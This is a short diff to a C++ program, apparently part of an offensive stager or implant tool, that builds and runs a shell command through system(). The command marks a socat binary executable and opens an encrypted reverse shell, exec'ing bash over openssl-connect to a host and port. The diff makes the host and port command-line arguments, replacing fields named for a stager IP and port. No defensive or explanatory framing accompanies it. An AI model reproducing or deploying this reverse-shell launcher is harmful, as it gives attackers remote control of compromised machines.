@@ -37,10 +37,10 @@ int main(int argc, char** argv){
 
 
     //socat - TCP:10.1.1.1:80
-    std::string command = "chmod 700 socat; ./socat exec:'bash',stderr,setsid openssl-connect:";
-    command.append(c._stagerIP);
+    std::string command = "chmod 700 socat; ./socat exec:'bash',sigint,stderr,setsid openssl-connect:";
+    command.append(argv[1]);
     command.append(":");
-    command.append(std::to_string(c._stagerPort));
+    command.append(argv[2]);
     command.append(",cafile=cert.pem");
     std::cout << command << std::endl;
     system(command.c_str());
